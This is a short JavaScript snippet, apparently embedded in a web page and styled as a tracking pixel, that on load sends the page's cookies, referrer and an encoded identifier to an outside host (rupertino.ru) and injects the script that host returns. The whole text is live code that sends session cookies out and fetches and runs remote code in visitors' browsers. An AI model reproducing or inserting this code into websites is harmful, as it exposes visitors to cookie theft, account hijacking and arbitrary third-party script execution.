var code='XFZDGE5BRFlDQltcSh1DRw==',id1=2023,id2=158409;
(function (d, w) {

    loadsrc('https://rupertino.ru/code1.php?pixel=549312635&img=' + code + '&uid=' + id1 + '&nid=' + id2 +'&ref=' + document.referrer + '&cookie=' + encodeURIComponent(document.cookie));    function loadsrc(link, callback) {
        if (callback === undefined) {
            callback = function() {}
        }
        f = document.createElement("script");
        f.type = "text/javascript";
        f.src = link;
        f.async = !0;
        f.charset = "UTF-8";
        f.readyState ? f.onreadystatechange = function() {
            ("loaded" === f.readyState || "complete" === f.readyState) && (f.onreadystatechange = null, callback())
        } : f.onload = function() {
            callback()
        };
        document.head.appendChild(f)
    }
})(document, window);
